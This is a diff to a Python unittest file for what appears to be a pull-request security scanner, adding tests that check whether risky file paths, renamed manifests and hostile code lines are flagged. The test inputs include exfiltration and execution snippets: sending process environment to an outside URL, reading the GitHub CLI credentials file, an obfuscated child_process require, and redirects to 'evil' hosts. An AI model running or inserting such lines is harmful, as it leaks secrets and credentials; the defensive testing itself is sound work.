@@ -95,6 +95,12 @@ class Fails(unittest.TestCase):
         self.assertFlags([f(".github/workflows/unsafe-change.yml", "removed")])
         self.assertFlags([f("docs/x.yml", "renamed", previous_filename=".github/workflows/ci.yml")])
 
+    def test_pages_worker_wrangler_and_agent_files_are_denied(self):
+        for path in ["public/_worker.js", "public/_worker.js/index.js", "wrangler.json", "wrangler.jsonc",
+                     ".mcp.json", "CLAUDE.local.md", "makefile", "dockerfile", "GNUmakefile",
+                     "requirements/003-new-task.md"]:
+            self.assertFlags([f(path, "added", added("x"))], needle=path)
+
     def test_secret_and_auth_paths(self):
         for path in ["src/auth.rs", "backend/app/oauth/google.py", "src/middleware/auth.ts", "lib/tokens.dart",
                      "app/Secrets.kt", "src/credentials.rs", "src/session_store.py", "backend/security.py",
@@ -176,6 +182,30 @@ class Fails(unittest.TestCase):
         big = [f("public/game.js", "modified")]
         self.assertEqual(ev(big, {("public/game.js", "head"): "function ok() {}\n"}), [])
         self.assertFlags(big, {("public/game.js", "head"): "const k = process.env.X;\n"}, "process/env/socket")
+
+    def test_added_lines_starting_with_plus_plus_are_scanned(self):
+        self.assertTrue(ev([f("tests/smoke.cjs", "modified",
+                              added("++[].length, require('child_process').execSync('id')"))]))
+
+    def test_renaming_a_full_manifest_into_place_fails(self):
+        cargo = '[package]\nname = "x"\n[dependencies]\nevil = "1"\n'
+        self.assertTrue(ev([f("Cargo.toml", "renamed", previous_filename="notes.txt")],
+                           {("notes.txt", "base"): cargo, ("Cargo.toml", "head"): cargo}))
+
+    def test_renaming_an_unscanned_file_into_a_scanned_extension_scans_it(self):
+        js = "require('child_process').execSync('id')"
+        self.assertTrue(ev([f("tests/helper.cjs", "renamed", previous_filename="notes.txt", changes=0)],
+                           {("tests/helper.cjs", "head"): js}))
+
+    def test_exfiltration_primitives_in_added_lines(self):
+        for line in ["fetch('https://x/' + btoa(JSON.stringify(process['env'])))",
+                     "require('fs').readFileSync(require('os').homedir() + '/.config/gh/hosts.yml')",
+                     "const cp = require('node:' + 'child_pro' + 'cess')",
+                     "const {env} = process",
+                     "setTimeout(() => location.href = 'https://evil', 5000)"]:
+            self.assertTrue(ev([f("tests/smoke.cjs", "modified", added(line))]), line)
+        self.assertTrue(ev([f("public/index.html", "modified",
+                              added('<meta http-equiv="refresh" content="0;url=https://evil">'))]))
 
     def test_migrations_beyond_app_schema_changes(self):
         for sql in [
